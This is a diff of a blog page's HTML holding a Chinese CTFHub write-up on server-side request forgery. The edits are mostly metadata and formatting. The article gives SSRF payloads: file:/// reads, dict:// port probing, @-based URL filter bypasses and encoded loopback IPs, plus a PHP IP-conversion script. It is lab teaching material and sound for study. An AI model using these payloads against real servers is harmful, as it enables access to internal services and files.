@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210404125802745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210404143514135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2021-04-04T06:44:37.220Z">
-<meta property="article:modified_time" content="2021-04-04T06:44:33.795Z">
+<meta property="article:modified_time" content="2022-01-13T17:21:26.708Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210404114641950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
@@ -141,7 +141,7 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">17</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">14</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
@@ -231,17 +231,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-04-04 14:44:37 / 修改时间：14:44:33" itemprop="dateCreated datePublished" datetime="2021-04-04T14:44:37+08:00">2021-04-04</time>
+              <time title="创建时间：2021-04-04 14:44:37" itemprop="dateCreated datePublished" datetime="2021-04-04T14:44:37+08:00">2021-04-04</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-14 01:21:26" itemprop="dateModified" datetime="2022-01-14T01:21:26+08:00">2022-01-14</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTFHub/" itemprop="url" rel="index"><span itemprop="name">CTFHub</span></a>
+                  <a href="/categories/ctf%E9%A2%98%E7%9B%AE/" itemprop="url" rel="index"><span itemprop="name">ctf题目</span></a>
                 </span>
             </span>
 
@@ -270,7 +276,7 @@
 <li>尝试访问位于127.0.0.1的flag.php吧</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20210404114757832.png#pic_center"><br>Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
 
 
 <hr>
@@ -278,34 +284,34 @@
 <li>尝试去读取一下Web目录下的flag.php</li>
 </ul>
 <p>根据题目的意思我们需要使用URL的伪协议去读取文件，那么我们首先要了解<code>URL的伪协议</code><br>URL伪协议有如下这些：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11673190.html">SSRF中的URL伪协议</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;</span><br><span class="line">sftp:&#x2F;&#x2F;</span><br><span class="line">ldap:&#x2F;&#x2F;</span><br><span class="line">tftp:&#x2F;&#x2F;</span><br><span class="line">gopher:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;</span><br><span class="line">sftp:&#x2F;&#x2F;</span><br><span class="line">ldap:&#x2F;&#x2F;</span><br><span class="line">tftp:&#x2F;&#x2F;</span><br><span class="line">gopher:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
 
 <p>用file读取 , Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>题目提示端口在8000-9000，因此直接扫就可以了。这里我们需要使用<code>dict伪协议</code>来扫描，因为dict协议可以用来探测开放的端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:8922   </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:8922   </span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210404115651941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1:8922</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1:8922</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210404115710581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h1 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h1><p>url解析问题<br>url跳转bypass：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.利用问好绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com?www.xxxx.me</span><br><span class="line">2.利用@绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com@www.xxxx.me</span><br><span class="line">3.利用斜杠反斜杠绕过限制</span><br><span class="line">4.利用#绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com#www.xxxx.me</span><br><span class="line">5.利用子域名绕过</span><br><span class="line">6.利用畸形url绕过</span><br><span class="line">7.利用跳转ip绕过</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.利用问好绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com?www.xxxx.me</span><br><span class="line">2.利用@绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com@www.xxxx.me</span><br><span class="line">3.利用斜杠反斜杠绕过限制</span><br><span class="line">4.利用#绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com#www.xxxx.me</span><br><span class="line">5.利用子域名绕过</span><br><span class="line">6.利用畸形url绕过</span><br><span class="line">7.利用跳转ip绕过</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210404115932888.png#pic_center"></p>
 <p>Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h1 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h1><ul>
 <li>Ip进制转换</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20210404120022591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1可以替换为:</span><br><span class="line">十六进制：0x7F000001</span><br><span class="line">十进制:  2130706433</span><br><span class="line">或 localhost</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1可以替换为:</span><br><span class="line">十六进制：0x7F000001</span><br><span class="line">十进制:  2130706433</span><br><span class="line">或 localhost</span><br></pre></td></tr></table></figure>
 
 <p>php脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> decoct(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> decoct(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 <hr>
@@ -446,7 +452,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
